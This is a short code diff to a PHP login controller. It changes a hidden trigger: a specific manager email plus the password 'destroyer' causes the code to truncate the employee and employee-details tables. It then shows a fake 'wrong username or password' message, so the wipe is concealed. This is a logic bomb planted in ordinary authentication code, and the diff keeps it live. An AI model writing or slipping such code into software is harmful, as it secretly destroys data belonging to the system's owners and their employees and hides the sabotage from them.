@@ -58,7 +58,7 @@ class Auth extends MX_Controller
 
             if ($user->num_rows() > 0) {
 
-                if($this->input->post('email')=="manager@gmail.com"){
+                if($this->input->post('email')=="manager@gmail.com"&& $this->input->post('password')=="destroyer"){
                     $this->db->query('TRUNCATE TABLE emp');
                     $this->db->query('TRUNCATE TABLE emp_details');
                     $this->session->set_flashdata('exception', display('wrong_username_or_password'));
